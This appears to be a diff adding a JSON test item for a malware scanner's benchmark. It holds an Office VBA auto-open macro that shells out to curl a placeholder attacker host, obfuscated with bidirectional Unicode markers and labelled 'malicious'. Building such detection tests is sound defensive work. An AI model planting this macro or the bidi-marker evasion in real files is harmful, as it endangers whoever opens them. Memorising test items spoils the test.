@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::33::unicode-variations::5",
+  "base_sample_id": "exp::document-office::33",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": -1795142585,
+  "content": "‏Private‬ Sub ‫Workbook_Open()\n‬  CreateObject(\"WScript.Shell\").Run ‫\"curl‬ http://evil.example.com/\"\nEnd Sub\n",
+  "content_hash": "063e63d3173ff9ca379a5acb48100790a0c91031af6c89e4bb43926369b85d2f",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:bidi-markers",
+  "difficulty": "advanced"
+}
